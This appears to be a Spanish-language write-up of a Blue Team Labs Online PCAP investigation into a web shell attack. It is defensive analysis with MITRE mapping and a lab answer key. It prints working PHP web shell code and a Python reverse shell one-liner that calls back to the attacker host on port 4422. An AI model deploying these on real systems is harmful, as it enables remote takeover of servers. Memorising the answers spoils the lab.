@@ -1,1 +1,171 @@
+# Lab: Análisis de Red – Web Shell
+**Plataforma:** Blue Team Labs Online  
+**Categoría:** Network Analysis  
+**Dificultad:** Media  
+**Fecha:** 2026  
+**Resultado:** 10/10 ✅
+
+---
+
+## Descripción
+
+El SOC recibió una alerta en el SIEM por "Escaneo de puertos de local a local", donde una IP privada interna comenzó a escanear otro sistema interno. Se proporcionó una captura PCAP para analizar el incidente completo.
+
+---
+
+## Herramientas utilizadas
+
+- Wireshark
+
+---
+
+## Resumen del ataque
+
+| Elemento | Detalle |
+|---|---|
+| IP atacante | 10.251.96.4 |
+| IP víctima | 10.251.96.5 |
+| Servidor víctima | Apache/2.4.29 (Ubuntu) |
+| Fecha del incidente | Sun, 07 Feb 2021 |
+
+---
+
+## Análisis paso a paso
+
+### 1. Identificación del atacante y escaneo de puertos
+
+**Filtro utilizado:**
+```
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+```
+
+La IP `10.251.96.4` generó más de 16,000 paquetes SYN hacia `10.251.96.5`. El análisis de los flags TCP reveló el patrón **SYN → SYN-ACK → ACK**, confirmando que el atacante completó el three-way handshake en cada puerto — esto corresponde a un **TCP Connect Scan (-sT de Nmap)**.
+
+![Port Scan](capturas/01_port_scan.png)
+
+**Rango de puertos escaneados:** 1 – 1024 (puertos well-known)
+
+![Rango de puertos](capturas/02_rango_puertos.png)
+
+---
+
+### 2. Reconocimiento con herramientas especializadas
+
+Se identificaron dos herramientas adicionales analizando los User-Agents HTTP con el filtro:
+
+```
+ip.src == 10.251.96.4 && !(http.user_agent contains "sqlmap") && !(http.user_agent contains "Mozilla")
+```
+
+**Herramienta 1 — sqlmap 1.4.7**  
+Usado para reconocimiento y explotación de SQL Injection contra la aplicación web.
+
+![sqlmap](capturas/03_sqlmap.png)
+
+**Herramienta 2 — Gobuster 3.0.1**  
+Usado para fuzzing de directorios y archivos en el servidor web.
+
+![Gobuster](capturas/04_gobuster.png)
+
+---
+
+### 3. Subida de la Web Shell
+
+El atacante aprovechó una funcionalidad de subida de archivos en `/editprofile.php`. Subió un archivo PHP malicioso disfrazado mediante el formulario de carga de imágenes.
+
+- **Archivo vulnerable:** `/upload.php`
+- **Web shell subida:** `dbfunctions.php`
+- **Tipo de contenido:** `application/x-php`
+- **Sesión autenticada:** `PHPSESSID=10b3rrv35ctuvv7vlnsfr6ugjt`
+
+**Código de la web shell:**
+```php
+<?php
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+}
+?>
+```
+
+El parámetro utilizado para ejecutar comandos es **`cmd`**.
+
+![Web Shell Upload](capturas/05_webshell_upload.png)
+
+---
+
+### 4. Ejecución de comandos y Reverse Shell
+
+El atacante accedió a la web shell subida en `/uploads/dbfunctions.php` y ejecutó un comando Python para establecer una **Reverse Shell**.
+
+**Comando ejecutado:**
+```python
+python -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.251.96.4",4422));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+- **Tipo de shell:** Reverse Shell en Python
+- **Puerto utilizado:** 4422
+- **Dirección de la conexión:** Víctima (10.251.96.5) → Atacante (10.251.96.4)
+
+![Reverse Shell](capturas/06_reverse_shell.png)
+
+---
+
+## Timeline del ataque
+
+| Hora (UTC) | Acción |
+|---|---|
+| 16:33:31 | Atacante navega la aplicación con Firefox |
+| 16:34:05 | Gobuster fuzzing de directorios |
+| 16:37:28 | sqlmap inyección SQL contra login.php |
+| ~16:34 | Nmap TCP Connect Scan puertos 1-1024 |
+| 16:40:39 | Subida exitosa de dbfunctions.php via upload.php |
+| Post-upload | Ejecución de reverse shell Python al puerto 4422 |
+
+---
+
+## Mapeo MITRE ATT&CK
+
+| Técnica | ID | Descripción |
+|---|---|---|
+| Network Service Scanning | T1046 | Nmap TCP Connect Scan puertos 1-1024 |
+| Exploit Public-Facing Application | T1190 | Upload de webshell via formulario vulnerable |
+| Web Shell | T1505.003 | dbfunctions.php con system($cmd) |
+| Command and Scripting Interpreter | T1059.006 | Reverse shell en Python |
+| Exfiltration Over C2 Channel | T1041 | Conexión reverse shell puerto 4422 |
+
+---
+
+## Respuestas del lab
+
+| Pregunta | Respuesta |
+|---|---|
+| IP responsable del escaneo | 10.251.96.4 |
+| Rango de puertos escaneados | 1 – 1024 |
+| Tipo de escaneo | TCP Connect Scan |
+| Herramientas de reconocimiento | sqlmap 1.4.7 y Gobuster 3.0.1 |
+| Archivo PHP vulnerable | upload.php |
+| Nombre de la web shell | dbfunctions.php |
+| Parámetro de la web shell | cmd |
+| Primer comando ejecutado | python reverse shell |
+| Tipo de conexión de shell | Reverse Shell |
+| Puerto de la shell | 4422 |
+
+---
+
+## Lecciones aprendidas
+
+- Validar el tipo real del archivo en el servidor, no solo la extensión o el Content-Type enviado por el cliente
+- Restringir los directorios de subida para que no sean ejecutables
+- Monitorear conexiones salientes en puertos no estándar como 4422
+- El filtro `!(contains "X") && !(contains "Y")` en Wireshark es más eficiente para descubrir herramientas desconocidas que buscar nombre por nombre
 
